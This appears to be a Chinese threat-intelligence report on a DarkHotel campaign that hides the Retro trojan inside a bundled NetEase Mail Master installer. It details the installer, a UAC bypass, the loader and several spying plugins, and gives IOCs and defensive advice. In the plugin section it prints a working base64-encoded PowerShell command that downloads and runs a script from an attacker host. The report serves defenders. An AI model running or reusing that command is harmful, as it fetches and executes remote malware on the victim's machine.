## 一、事件概述

**腾讯御见威胁情报中心曾在2018年4月披露过"寄生兽"（DarkHotel）在2018年针对中国外贸企业高管的定向攻击活动。近期，我们再次检测到该攻击组织的最新攻击活动，依然针对跟半岛地区相关的外贸企业高管进行的攻击活动。**

本次攻击活动跟之前的攻击活动相比，整体的攻击框架变化不大，如依然寄生在正常的软件里（网易邮箱大师）、采用插件模式等。但是在技术细节上也进行了一定的更新，如更新了绕过UAC的技术，更新了根据杀软情况使用不同启动方式等技术。

"寄生兽"是腾讯御见威胁情报在2017年捕捉的一个APT特种木马（以下简称“特马”），该特马的特征为喜欢把恶意文件隐藏在开源的代码或者正常软件中进行伪装，如putty、openssl、zlib等，把少量木马代码隐藏在大量的开源代码中，从而实现躲避检测的目的，因此将其取名“寄生兽”。而同时经过大量的溯源、关联，我们确定该特马为APT攻击组织DarkHotel（“黑店”）所有。

## 二、技术细节

### 1、 攻击入口

本次攻击疑似采用水坑攻击的方法，把网易邮箱大师的主程序和木马文件捆绑在一起，然后进行传播。

打包伪装的网易邮箱大师文件（没有数字签名）：

![](https://image.3001.net/images/20190624/1561360302_5d1077ae9ce96.png!small)

木马释放的真正的网易邮箱大师的文件（有数字签名）：

![](https://image.3001.net/images/20190624/1561360320_5d1077c02fb49.png!small)

![](https://image.3001.net/images/20190624/1561360330_5d1077ca6d216.png!small)

### 2、 安装器（Installer）分析

本次攻击的主程序为捆绑了网易邮箱大师的主程序的恶意文件，该文件会释放真正的网易邮箱大师主程序运行，然后下载恶意的木马dll并加载。

1） Starts.exe

该文件首先解密出C2和木马版本标记信息：

![](https://image.3001.net/images/20190624/1561360331_5d1077cb23123.png!small)

在当前目录下释放starts.exe，并执行，释放出的文件是网易邮箱大师的主文件：

![](https://image.3001.net/images/20190624/1561360337_5d1077d1ef1c2.png!small)

如果成功运行starts.exe则开始进行木马下载行为：连接C2，并post 8字节随机数据，接收返回数据：

![](https://image.3001.net/images/20190624/1561360340_5d1077d4439c1.png!small)

下载成功后，通过定位ReflectiveLoader函数进行自加载：

![](https://image.3001.net/images/20190624/1561360346_5d1077da8db42.png!small)

2） WWWWXXXX.dll

该dll为Starts加载的dll。首先判断加载自身的进程，如果是powershell，则开始进行下载行为：

![](https://image.3001.net/images/20190624/1561360356_5d1077e47c9b4.png!small)

获取本机信息，包括计算机名、用户名等信息及进程列表：

![](https://image.3001.net/images/20190624/1561360361_5d1077e9cbb21.png!small)

检测指定目录下是否有lame.dll，如果没有则开始下载，有则退出：

![](https://image.3001.net/images/20190624/1561360370_5d1077f2250f2.png!small)

解密出下载url，进行下载，下载后比较是否为<!DOCTYPE html>开头，是则开始解密：

![](https://image.3001.net/images/20190624/1561360376_5d1077f8bf1a1.png!small)

解密完后写入到lame.dll中：

![](https://image.3001.net/images/20190624/1561360381_5d1077fd14fef.png!small)

此外，如果当前dll是由winword.exe进程加载，则使用rundll32.exe加载本dll并调用lame函数：

![](https://image.3001.net/images/20190624/1561360392_5d107808364e9.png!small)

lame函数中检测360tray.exe、ZhuDongFangYu.exe、QHSafeTray.exe、QHActiveDefense.exe、AvastUI.exe、avgui.exe杀软进程，如果存在任何一个则下载lame.dll，并执行命令将其拷贝到system32目录中命名为msTracer.dll进行劫持，并将wsearch服务设为开机启动实现开机自启：

![](https://image.3001.net/images/20190624/1561360412_5d10781cb59e3.png!small)

如果不存在则创建rundll32.exe进程加载本dll并调用其lame3函数：

![](https://image.3001.net/images/20190624/1561360411_5d10781ba7d88.png!small)

Lame3函数主要实现通过修改注册表使得lame.dll开机自启动：

![](https://image.3001.net/images/20190624/1561360422_5d107826e98d0.png!small)

如果是SearchIndexer.exe加载本dll则创建SearchProtocolHost.exe进程：

![](https://image.3001.net/images/20190624/1561360426_5d10782a671e1.png!small)

至此，完成整个恶意文件的安装过程。

### 3、 绕过uac（bypass uac）分析

WWWWXXXX.dll运行过程中如果发现当前进程非管理员权限，会先释放绕过UAC的dll文件来绕过UAC（756676dbc90f5a66fc565be538dec896），该dll通过利用CMSTP绕过UAC。

![](https://image.3001.net/images/20190624/1561360435_5d1078338de5a.png!small)

### 4、 加载器（loader）分析

lame.dll为木马loader程序。木马总体结构，启动技术等与之前版本基本相同，可以确定为Retro RAT
木马的最新版本。木马在多个位置调用了核心下载函数，该函数有两种模式，参数分别为1和0：

![](https://image.3001.net/images/20190624/1561360457_5d107849dc494.png!small)

首先解密出url域名和参数，然后进行网络访问：

![](https://image.3001.net/images/20190624/1561360463_5d10784fe8635.png!small)

解密C2并构造url：

![](https://image.3001.net/images/20190624/1561360471_5d107857236f3.png!small)

解密出的C2：

![](https://image.3001.net/images/20190624/1561360476_5d10785c3ef08.png!small)

判断返回的指令，如果含reset则删除vector.dat文件，如果含<!DOCTYPE html>字符则将数据解密：

![](https://image.3001.net/images/20190624/1561360482_5d10786233a3b.png!small)

根据下载函数的调用模式处理解密后的数据：

模式1：在自身进程中申请内存，并创建线程直接执行解密后的代码

![](https://image.3001.net/images/20190624/1561360490_5d10786a6c316.png!small)

模式2：搜索特征，定位PE文件机构，查找ReflectiveLoader自加载函数进行调用加载执行

![](https://image.3001.net/images/20190624/1561360502_5d10787607bad.png!small)

![](https://image.3001.net/images/20190624/1561360508_5d10787c66d0c.png!small)

![](https://image.3001.net/images/20190624/1561360519_5d1078871ae10.png!small)

![](https://image.3001.net/images/20190624/1561360575_5d1078bfc7abb.png!small)

### 5、 插件分析

采用插件形式，也是本系列木马的一个特色，本次攻击我们发现了非常多的恶意木马插件，主要如下：

1） 插件一：

执行powershell命令：

powershell -ex bypass
-eJAB1AHIAbAA9ACcAaAB0AHQAcAA6AC8ALwBnAGEAbQBlAC0AcwBlAHIAdgBpAGMAZQAuAG8AcgBnAC8AcgBtAGUAdABfAHgANgA0AC4AdAB4AHQAJwA7ACQAdwA9AE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ADsAJABzAD0AJAB3AC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJAB1AHIAbAApADsAaQBlAHgAIAAkAHMAOwA=

![](https://image.3001.net/images/20190624/1561360588_5d1078cc7e422.png!small)

其功能是下载<http://game-service.org/rmet_x64.txt>并作为powershell脚本执行，内容如下：

![](https://image.3001.net/images/20190624/1561360595_5d1078d3db42a.png!small)

其功能是解密出一段脚本并创建powershell进程执行，解密后的脚本如下：

![](https://image.3001.net/images/20190624/1561360604_5d1078dcca4cb.png!small)

其功能是申请一块内存，并解密出一段shellcode，创建线程执行shellcode：

![](https://image.3001.net/images/20190624/1561360611_5d1078e31e1e6.png!small)

![](https://image.3001.net/images/20190624/1561360618_5d1078ea0a2a6.png!small)

连接193.29.187.178:51217

![](https://image.3001.net/images/20190624/1561360629_5d1078f5544f7.png!small)

Recv 4字节数据后将其作为大小申请内存，再recv该大小的数据，然后跳入数据（shellcode）中执行。

事实上，该文件也存在x86版本：<http://game-service.org/rmet_x86.txt>

![](https://image.3001.net/images/20190624/1561360665_5d107919aa39b.png!small)

功能和x64类似，不再赘述。

2） 插件二：mkmfc.dll（5f28da2bbbed8ffb3728855f1910ba6d）

该插件为键盘记录插件，本插件用于键盘记录，记录按键信息、窗口标题、时间：

![](https://image.3001.net/images/20190624/1561360658_5d107912a7b5f.png!small)

![](https://image.3001.net/images/20190624/1561360667_5d10791b21dbf.png!small)

3） 插件三：weepyll_x64.dll（691519faf521d524f21a578209809db2）

内网渗透插件，主要用于横向移动：

![](https://image.3001.net/images/20190624/1561360679_5d10792766a97.png!small)

![](https://image.3001.net/images/20190624/1561360688_5d107930cc879.png!small)

C2为：193.29.187.178：51218

4） 插件四：hird.dll（6468180d1fcf15a8c8420a60268b642d）

该插件用于用于窃取数据库文件：

![](https://image.3001.net/images/20190624/1561360699_5d10793b56a76.png!small)

5） 插件五：nksen.dll（d7f0cee4a3ca878e24c770b0a1874920）

该插件用于屏幕监控：

![](https://image.3001.net/images/20190624/1561360739_5d1079635db5f.png!small)

6） 插件六：xrat_ps-91.235.116.147.exe

该插件主要有3个文件：

igfxrot.exe（a7daffc2420752412ebae9a66d405a48）

TiWork.exe（70c46cb056f338a7535e7b4d2254f09e）

TiWork.exe（90921b35bb51c8db8f4fef6988d9fac2）

三个文件均为开源远程控制木马XRAT，该远控可以进行键盘记录、远程下载执行恶意文件、上传文件、反向代理等功能：

![](https://image.3001.net/images/20190624/1561360744_5d107968c26c1.png!small)

![](https://image.3001.net/images/20190624/1561360753_5d107971975d2.png!small)

![](https://image.3001.net/images/20190624/1561360779_5d10798b0a5cc.png!small)

C2均为：91.235.116.147

## 三、关联分析

经过关联分析，我们确定该次攻击来源于DarkHotel（“黑店”），并且使用的是最新的Retro系列木马（寄生兽）。

关联一：本次木马文件中含有大量调试提示信息，可见木马名称为Retro，与之前的寄生兽木马一致：

![](https://image.3001.net/images/20190624/1561360776_5d1079886c143.png!small)

关联二：本次攻击使用的部分c2也曾经用于之前的攻击：

![](https://image.3001.net/images/20190624/1561360845_5d1079cd6856b.png!small)

![](https://image.3001.net/images/20190624/1561360812_5d1079acca7c0.png!small)

![](https://image.3001.net/images/20190624/1561360883_5d1079f3af665.png!small)

关联三：url参数格式

本次通信的参数格式跟之前的寄生兽活动一致：

![](https://image.3001.net/images/20190624/1561360823_5d1079b758721.png!small)

![](https://image.3001.net/images/20190624/1561360879_5d1079ef4830c.png!small)

因此我们确定该活动为"寄生兽"（darkhotel）的最新攻击活动。

## 四、总结

"寄生兽"木马是一个复杂的恶意木马，并且喜欢隐藏中正常的软件和开源代码中，这也大大增加了检测和防御的难度。并且模块不落地、插件模式，已经越来越成为主流，被大量的APT攻击组织所使用。

此外，外贸行业、企业高管为Darkhotel（“黑店”）APT组织的重点攻击对象，该组织擅长通过伪造高端酒店WiFi或劫持网络连接等方式释放攻击程序，高危人群应高度重视。我们建议参考以下几点加强防御：

1、 通过官方渠道或者正规的软件分发渠道下载相关软件；

2、谨慎连接公用的WiFi网络。若必须连接公用WiFi网络，建议不要进行可能泄露机密信息或隐私信息的操作，如收发邮件、IM通信、银行转账等；最好不要在连接公用WiFi时进行常用软件的升级操作；

3、不要打开不明来源的邮件附件；

4、及时打系统补丁和重要软件的补丁；

## 五、附录

### 1、IOCs

MD5：

    
    
    eaa751a36a6da7b1520a5ee38f33cf5b mstracer.dll（lame.dll/oci.dll）
    
    d7f0cee4a3ca878e24c770b0a1874920 nksen.dll
    
    6468180d1fcf15a8c8420a60268b642d hird.dll
    
    691519faf521d524f21a578209809db2 weepyll.dll
    
    5f28da2bbbed8ffb3728855f1910ba6dmkmfc.dll
    
    bd50caef3fac72d7e29e90ee76b8c361 WWWWXXXX.dll
    
    7c72def5a30d1e6bca85ea22a4c5ee15 starts.exe
    
    a7daffc2420752412ebae9a66d405a48 igfxrot.exe
    
    70c46cb056f338a7535e7b4d2254f09e TiWork.exe
    
    90921b35bb51c8db8f4fef6988d9fac2 TiWork.exe
    
    756676dbc90f5a66fc565be538dec896

C2：

[](http://game-service.org/584e3411-14a7-41f4-ba1d-e203609b0471/6126.php)

    
    
    <http://game-service.org/584e3411-14a7-41f4-ba1d-e203609b0471/6126.php>;
    
    <http://office-update-checker.com/584e3411-14a7-41f4-ba1d-e203609b0471/6126.php>;
    
    <http://game-service.org/rmet_x64.txt>
    
    <http://game-service.org/rmet_x86.txt>
    
    193.29.187.178:51217
    
    193.29.187.178:51218
    
    <http://offices-support.com/7cdeb7fe-6efd-4459-be2f-1eb0e0088a60/21147.php>;
    
    91.235.116.147:9782
    
    <http://star--co.net/banila/config.php>;
    
    <http://100100011100.com/banila/config.php>;
    
    <http://779999977.com/banila/config.php>;
    
    <http://banilasky.com/banila/config.php>;

pdb：

    
    
    C:\Work\GLonginusLance\x64\Release\GLonginusLanceWin32UACMEInit_x64_Release.pdb
    
    C:\workspace\201808-NewKeyLogger\mkmfc\x64\mkmfc_x64.pdb
    
    2、参考链接
    
    1）腾讯御见：<https://s.tencent.com/research/report/465.html>
    
    2）奇安信：<https://ti.qianxin.com/blog/articles/analysis-of-darkhotel/>

[](https://ti.qianxin.com/blog/articles/analysis-of-darkhotel/)

 ***本文作者：腾讯电脑管家，转载请注明来自FreeBuf.COM**

